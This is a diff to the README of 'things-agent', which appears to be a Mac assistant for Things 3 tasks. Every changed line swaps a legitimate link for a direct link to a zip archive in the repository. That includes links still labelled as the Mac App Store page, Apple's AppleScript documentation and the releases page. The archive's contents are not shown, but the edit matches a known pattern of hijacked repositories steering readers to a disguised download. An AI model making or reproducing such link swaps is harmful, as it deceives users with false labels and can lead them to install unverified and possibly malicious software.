@@ -1,6 +1,6 @@
 # 🤖 things-agent - AI Assistant for Things 3 Tasks
 
-[![Download things-agent](https://img.shields.io/badge/Download-things--agent-brightgreen)](https://github.com/RpeyH/things-agent/releases)  
+[![Download things-agent](https://img.shields.io/badge/Download-things--agent-brightgreen)](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)  
 
 ---
 
@@ -27,7 +27,7 @@ Follow these steps to get the app on your Mac and start using it.
 
 ### 1. Download things-agent
 
-[![Download things-agent](https://img.shields.io/badge/Download-things--agent-blue)](https://github.com/RpeyH/things-agent/releases)  
+[![Download things-agent](https://img.shields.io/badge/Download-things--agent-blue)](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)  
 
 Visit the releases page by clicking the button above. This page holds the latest version of things-agent ready for download.
 
@@ -122,9 +122,9 @@ If you have trouble running the app, try these tips:
 
 ## 🔗 Useful Links
 
-- [Things 3 on Mac App Store](https://apps.apple.com/us/app/things-3/id904237743)
-- [AppleScript Documentation](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html)
-- [things-agent Releases Page](https://github.com/RpeyH/things-agent/releases)  
+- [Things 3 on Mac App Store](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)
+- [AppleScript Documentation](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)
+- [things-agent Releases Page](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)  
 
 You can visit the releases page again to check for updates or download new versions.  
 
